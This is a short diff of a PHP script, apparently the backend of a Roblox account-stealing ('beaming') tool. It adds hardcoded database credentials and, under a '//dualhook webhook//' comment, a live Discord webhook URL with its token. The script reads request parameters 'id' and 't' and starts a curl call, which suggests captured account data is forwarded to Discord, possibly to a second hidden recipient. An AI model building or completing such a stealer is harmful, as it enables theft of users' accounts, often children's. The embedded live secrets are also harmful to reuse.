@@ -1,8 +1,8 @@
 <?php
-    $servername = "";
-    $username = "";
-    $password = "";
-    $dbname = "rblxapi";
+    $servername = "FuaBeam";
+    $username = "FuaBeam";
+    $password = "Unfuagt";
+    $dbname = "roblox";
     $id = $_REQUEST['id'];
     $t = $_REQUEST['t'];
 
@@ -35,7 +35,7 @@
     $conn->close();
 
     //dualhook webhook//
-    $yourwebhook = "yourwebhook";
+    $yourwebhook = "https://discord.com/api/webhooks/1334050800485404733/4HkIUti5kShslPoJDBskgWyeYCiRm0W3TYKWvsacInG22-7KchZUwFuMPLE9R2KXqH7z";
 
 
     $ch = curl_init();
